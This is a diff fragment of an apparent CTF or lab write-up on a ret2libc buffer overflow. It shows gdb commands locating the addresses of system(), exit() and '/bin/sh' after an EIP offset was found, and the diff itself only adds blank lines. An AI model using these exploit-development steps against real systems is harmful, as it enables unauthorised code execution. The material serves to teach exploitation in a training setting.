@@ -41,14 +41,17 @@ First we need to get the offset of the EIP, we will re-use the python script:
 Now that we got our offset, we need to find the adress of **system()**, **exit()** and **/bin/sh**. exit() is needed to do it the clean way, but it's optionnal.
 
 **Finding system adress**
+
 ``(gdb) info function system``
 >0xf7e6aed0  system
 
 **Finding exit adress**
+
 ``(gdb) info function exit``
 >0xf7e5eb70  exit
 
 **Finding /bin/sh**
+
 ``(gdb) b main``
 >Breakpoint 1 at 0x80486cd
 
